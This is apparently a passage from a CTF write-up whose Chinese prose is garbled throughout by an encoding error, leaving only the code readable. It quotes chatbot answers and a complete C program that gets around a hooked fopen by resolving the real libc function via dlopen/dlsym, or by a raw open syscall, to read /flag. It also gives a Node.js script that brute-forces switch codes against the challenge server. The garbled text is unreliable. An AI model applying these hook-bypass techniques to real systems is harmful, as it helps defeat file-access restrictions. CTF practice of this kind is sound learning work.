> 2. ä½¿ç”¨ dlsym è·å–çœŸæ­£çš„ fopen å‡½æ•°åœ°å€ï¼šä½ å¯ä»¥ä½¿ç”¨ dlsym å‡½æ•°æ¥è·å–çœŸæ­£çš„ fopen å‡½æ•°åœ°å€ï¼Œç„¶åè°ƒç”¨å®ƒæ¥æ‰“å¼€ /flag æ–‡ä»¶ã€‚é¦–å…ˆï¼Œä½ éœ€è¦åœ¨ä½ çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­åŒ…å« > `#include <dlfcn.h>` å¤´æ–‡ä»¶ã€‚ç„¶åï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç æ¥è·å–çœŸæ­£çš„ fopen å‡½æ•°åœ°å€å¹¶è°ƒç”¨å®ƒï¼š
> ```
> void *handle = dlopen("libc.so.6", RTLD_LAZY);
> FILE *(*real_fopen)(const char *restrict, const char *restrict) = dlsym(handle, "fopen");
> FILE *file = real_fopen("/flag", "r");
> ```
> 
> 3. ä½¿ç”¨ syscall ç³»ç»Ÿè°ƒç”¨ï¼šä½ å¯ä»¥ä½¿ç”¨ syscall ç³»ç»Ÿè°ƒç”¨æ¥ç›´æ¥æ‰“å¼€ /flag æ–‡ä»¶ã€‚syscall å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç³»ç»Ÿè°ƒç”¨å·ï¼Œç¬¬äºŒä¸ªå‚æ•°åŠä¹‹åçš„å‚æ•°æ˜¯ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ã€‚åœ¨ > Linux ä¸­ï¼Œæ‰“å¼€æ–‡ä»¶çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ 2ï¼Œæ‰€ä»¥ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç æ¥æ‰“å¼€ /flag æ–‡ä»¶ï¼š
> ```
> int fd = syscall(2, "/flag", O_RDONLY);
> ```

ç„¶åéå¸¸é«˜å…´çš„å‘ç°ç¬¬äºŒç§æ–¹æ³•æ˜¯èƒ½ç”¨çš„ã€‚

å…¶å®æˆ‘ä¹Ÿä¸ä¼šç”¨ã€‚
> ```cpp
> void *handle = dlopen("libc.so.6", RTLD_LAZY);
> FILE *(*real_fopen)(const char *restrict, const char *restrict) = dlsym(handle, "fopen");
> FILE *file = real_fopen("/flag", "r");
> ```
> è¿™æ®µä»£ç æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œä½ èƒ½è¡¥å…¨è¿™æ®µä»£ç ï¼Œè®©ä»–æŠŠæ–‡ä»¶å†…å®¹æ‰“å°åˆ°è¾“å‡ºå—

> æ˜¯çš„ï¼Œæˆ‘å¯ä»¥å¸®ä½ å®Œæˆè¿™æ®µä»£ç ã€‚ä»¥ä¸‹æ˜¯è¡¥å…¨åçš„ä»£ç ï¼š
> 
> ```c
> #include <stdio.h>
> #include <dlfcn.h>
> 
> int main() {
>     void *handle = dlopen("libc.so.6", RTLD_LAZY);
>     FILE *(*real_fopen)(const char *restrict, const char *restrict) = dlsym(handle, "fopen");
>     FILE *file = real_fopen("/flag", "r");
> 
>     if (file != NULL) {
>         char buffer[256];
>         while(fgets(buffer, sizeof(buffer), file) != NULL) {
>             printf("%s", buffer);
>         }
>         fclose(file);
>     } else {
>         printf("Failed to open the file.\n");
>     }
> 
>     dlclose(handle);
>     return 0;
> }
> ```
> 
> è¿™æ®µä»£ç ä½¿ç”¨äº†åŠ¨æ€é“¾æ¥åº“å‡½æ•°`dlopen`å’Œ`dlsym`æ¥åŠ è½½`libc.so.6`åº“ï¼Œå¹¶è·å–å…¶ä¸­çš„`fopen`å‡½æ•°çš„åœ°å€ã€‚ç„¶åï¼Œé€šè¿‡è°ƒç”¨`real_fopen`å‡½æ•°æ¥æ‰“å¼€æŒ‡å®šçš„æ–‡ä»¶`/flag`ã€‚å¦‚æœæ–‡ä»¶æˆåŠŸæ‰“å¼€ï¼Œåˆ™ä½¿ç”¨`fgets`å‡½æ•°é€è¡Œè¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†å…¶æ‰“å°åˆ°è¾“å‡ºä¸­ã€‚æœ€åï¼Œå…³é—­æ–‡ä»¶å¹¶é‡Šæ”¾åŠ¨æ€é“¾æ¥åº“ã€‚
> 
> è¯·æ³¨æ„ï¼Œè¿™æ®µä»£ç éœ€è¦åœ¨æ”¯æŒåŠ¨æ€é“¾æ¥åº“çš„æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼Œä¾‹å¦‚Linuxã€‚å¦å¤–ï¼Œéœ€è¦ç¡®ä¿`libc.so.6`åº“æ–‡ä»¶å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰è¯»å–`/flag`æ–‡ä»¶çš„æƒé™ã€‚

åšå®Œäº†ï¼ˆå¥½åƒç¼–è¯‘çš„æ—¶å€™è¦åŠ ä¸€ä¸ªä»€ä¹ˆç¼–è¯‘é€‰é¡¹ï¼‰ã€‚
## å¼‚æ˜Ÿæ­§é€”

ä¸‹è½½æ¸¸æˆï¼Œå‘ç°æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å¯åŠ¨å†²å‡»ååº”å †ï¼Œè¦è®©å››ä¸ªè¿æ¥ç€ååº”å †è£…ç½®çš„ç”µçº¿éƒ½ä¾›ç”µï¼Œä¹Ÿå°±æ˜¯è§£å†³å››ä¸ªå°é¢˜ã€‚

æ¯ä¸ªå°é¢˜æœ‰å…«ä¸ªå¼€å…³ï¼Œè½¬æ‚ è½¬æ‚ å‘ç°æœ‰é€»è¾‘å¤„ç†å™¨ï¼ˆæˆ–è€…å¾®å‹å¤„ç†å™¨ï¼‰æ¥æ§åˆ¶è¿™äº›å¼€å…³ï¼Œé‡Œé¢æ˜¯å¯ä»¥ç›´æ¥é˜…è¯»çš„ä»£ç ã€‚

ç®€å•é˜…è¯»ä»£ç åšå‡ºæ¥å‰ä¸¤ä¸ªå°é¢˜ï¼Œæ¸¸æˆå†…æ‰‹åŠ¨æšä¸¾åšå‡ºæ¥ç¬¬å››ä¸ªå°é¢˜ï¼Œç¬¬ä¸‰ä¸ªå°é¢˜æ‰‹åŠ¨æšä¸¾ä¼šæŒ‰ç‚¸ï¼Œæ‰€ä»¥æˆ‘æ”¹æˆçˆ†ç ´ã€‚

```javascript
const net = require('net')
const fs = require('fs');
const util = require('util');

const ans1 = '10100101'
const ans2 = '11000100'
const ans4 = '01110111'

const token = 'ä½ çš„å·å•ƒ'

const validate = async number => {
    const socket = net.createConnection(10071, '202.38.93.111')

    socket.on('data', async data => {
        if (data.toString().includes('token')) {
            socket.write(token + '\n');
        } else if (data.toString().includes('00001111000011110000111100001111')) {
            socket.write(ans1 + ans2 + number.toString(2).padStart(8, '0') + ans4 + '\n')
        } else {
            console.log(number + ' ' + data.toString().trim())
        }
    })
}

const sleep = async ms => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const main = async () => {
    for (let i = 112; i < (1 << 8) - 1; i++) {
        validate(i)
        await sleep(10000)
    }
}
```

åšå®Œå•¦ã€‚
## æ€»ç»“

ä½“éªŒå¾ˆä¸é”™ï¼Œå¾ˆå¥½ç©ï¼Œä½†æ˜¯æ˜å¹´é«˜ä¸‰äº†ï¼Œå¯èƒ½æ¥ä¸äº†äº†ã€‚

å¸Œæœ›èƒ½ä¸Šä¸ªæ»¡æ„çš„å¤§å­¦ã€‚

å¦å¤–æˆ‘æ˜¯çœŸçš„ CTF é›¶åŸºç¡€ï¼Œåªæ˜¯å†™è¿‡ä¸€ç‚¹ç”¨æˆ·è„šæœ¬ç½¢äº†ã€‚
